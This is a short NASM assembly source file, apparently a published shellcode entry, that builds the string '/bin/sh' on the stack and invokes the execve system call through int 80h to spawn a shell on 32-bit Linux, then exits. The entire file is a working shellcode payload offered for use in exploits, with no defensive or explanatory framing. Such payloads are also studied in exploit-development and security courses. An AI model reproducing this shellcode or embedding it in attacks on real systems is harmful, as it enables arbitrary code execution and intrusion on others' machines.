;/*
; * Title:	Linux x86 execve("/bin/sh") - 28 bytes
; * Author:	Jean Pascal Pereira <pereira@secbiz.de>
; * Web:	http://0xffe4.org
; *
; */

section .text

bits 32

global _start

_start:

	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	xor ecx,ecx
	xor edx,edx
	mov al,0xb
	int 80h
	xor eax,eax
	inc eax
	int 80h